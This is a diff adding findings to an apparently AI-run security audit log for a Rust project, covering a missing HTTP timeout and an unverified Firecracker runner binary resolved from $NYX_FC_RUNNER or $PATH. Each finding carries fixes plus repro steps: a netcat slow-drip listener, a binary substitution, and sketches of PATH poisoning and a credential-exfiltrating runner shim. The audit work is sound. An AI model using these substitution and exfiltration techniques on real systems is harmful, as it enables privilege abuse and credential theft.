+  "suggested_payload_hint": "Defence: `reqwest::Client::builder().timeout(Duration::from_secs(10)).connect_timeout(Duration::from_secs(5)).user_agent(...).build()`. Also wrap the `.send().await` in `tokio::time::timeout(Duration::from_secs(15), ...)` as a defence-in-depth in case reqwest's per-request timeout is misconfigured. Repro: run a netcat listener that accepts the TCP handshake then sends one byte every 30s (`while true; do printf 'X'; sleep 30; done | nc -l 8443`); host-pin `api.github.com` to 127.0.0.1; trigger an ingest with `auth = \"token-env:NYX_GH_TOKEN\"`; observe `ingest_git` never returns and the worker is stuck on the validate-scopes future indefinitely."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-sandbox/src/backend/firecracker.rs",
+  "line": 249,
+  "cap": "OS_COMMAND",
+  "endpoint": "<sandbox:firecracker backend startup>",
+  "rationale": "resolve_runner_path (firecracker.rs:249-267) accepts the `nyx-fc-runner` binary from `$NYX_FC_RUNNER` (a non-secret env var the operator may set anywhere) or from `$PATH` via `which_on_path`. The only check is `is_file()` (firecracker.rs:252). No signature, no hash, no owner-uid check, no path-allowlist. The runner is the binary that ultimately drives Firecracker via /dev/kvm, so it MUST run with substantial privileges (KVM access typically means group `kvm` on Linux, network-namespace setup typically needs CAP_NET_ADMIN). Subsequent `Command::new(&self.runner_path)` at firecracker.rs:187 invokes that binary and writes a JSON FirecrackerSpec to its stdin (firecracker.rs:200-205). Three concrete attack shapes the static pass cannot see: (a) an attacker who controls `~/.bashrc` / a systemd unit override / supervisord config can set `NYX_FC_RUNNER=/tmp/payload` and the next daemon restart runs /tmp/payload as the agent UID with whatever sandbox-spawn privs the agent holds, plus the JSON spec arrives on stdin so the payload also learns the workspace path and argv — a useful pivot for cred theft from the workspace .env files (sentinel:2752 covers the secrets-file surface); (b) `$PATH` poisoning: the resolution at line 260 calls `super::which_on_path(RUNNER_BINARY)` — if the operator's PATH contains `.` or `~/bin` or any world-writable dir BEFORE the real `/usr/local/bin/nyx-fc-runner`, a writer there wins; (c) ToCToU between `is_file()` at line 252 and `Command::new(&runner_path)` at line 187 in `Sandbox::run` — the resolve happens once in `new()` but spawn happens later, so a writer to the resolved path between construct and run substitutes the binary. Most damaging when chained with sentinel:2843 (sandbox lib fail-open lane=None) and the env-builder secrets surfaces (sentinel:2757 / 2814) because the substituted runner inherits the agent's full process privileges, not the post-sandbox guest privileges. Static pass missed because Command::new(absolute_path) where absolute_path came from an env var does not match the canonical OS-injection sink shape (no shell, no format!, no operator-supplied argv).",
+  "suggested_payload_hint": "Defence (root cause): (1) ship `nyx-fc-runner` with a pinned canonical install path (`/usr/local/libexec/nyctos/nyx-fc-runner` or similar under root:root 0755) and refuse to resolve runners outside that path unless `NYX_FC_RUNNER` ALSO carries a positive ownership check (`stat::st_uid == 0 && st_mode & 0o022 == 0`). (2) drop the `$PATH` fallback entirely; require the env var or the canonical path. (3) after resolve, verify a known-good SHA-256 baked at compile time via `env!(\"NYX_FC_RUNNER_SHA256\")` (CI provides it) and refuse to spawn on mismatch — same threat model as the existing repro_bundle SHA verification path. Repro: as the operator UID, `cp /bin/echo /tmp/fake-runner && export NYX_FC_RUNNER=/tmp/fake-runner`, then trigger any sandbox run that selects the firecracker backend; the daemon spawns /tmp/fake-runner, which receives the FirecrackerSpec JSON on stdin — a real exploit replaces echo with a shim that exfiltrates the spec and forks the real runner so the operator notices nothing."
+}
+
+---
+pass 35 summary
+- 5 new findings against the dirty-tree diff in nyctos-core/src/repo/git.rs
+  and nyctos-sandbox/src/backend/firecracker.rs. Both files had no
+  pre-existing rows in this sentinel (firecracker.rs is wholly uncovered;
+  git.rs is a fresh module replacing the prior nyx-agent ingest path).
+  - git.rs:145 CRED_EXPOSURE (bearer on argv via -c http.extraheader)
+  - git.rs:84  AUTH_BYPASS (NoScopeHeader → accept; fine-grained PATs
+    with write perms pass the WRITE_SCOPES gate)
+  - git.rs:205 MITM (StrictHostKeyChecking=accept-new — SSH TOFU on
+    first clone in fresh-container deploys)
+  - git.rs:263 DOS (validate_token_scopes_at has no reqwest timeout;
+    slow upstream stalls the ingest worker indefinitely)
+  - firecracker.rs:249 OS_COMMAND (runner path resolution accepts any
+    is_file() from $NYX_FC_RUNNER or $PATH; no integrity check on a
+    binary that runs with /dev/kvm + network-namespace privileges)
+- Surveyed but did NOT emit (covered upstream or low-signal):
+  log_init.rs `looks_like_secret` fallback heuristic miss for long
+  underscore-less secrets (related to sentinel:2552 cred-exposure
+  family but the redactor is a defence-in-depth layer not the primary
+  authority — emitting would be noise); secrets.rs memory backend
+  Arc<Mutex<HashMap>> shared across clones (intentional design per
+  module doc, not a finding); firecracker env_image / kernel
+  caller-supplied paths handed verbatim to runner (the runner owns
+  mount semantics; agent-side canonicalisation belongs in the
+  out-of-tree runner, not in this backend skeleton).
+- tool budget ~9 / 24 used (Read x5, Glob x2, Bash x1, Grep x1, Edit x1).
+  No HTTP probes (ALLOWED HOSTS empty). No fs writes outside
+  nyx_exploration.sentinel. Wall clock ~4 min.
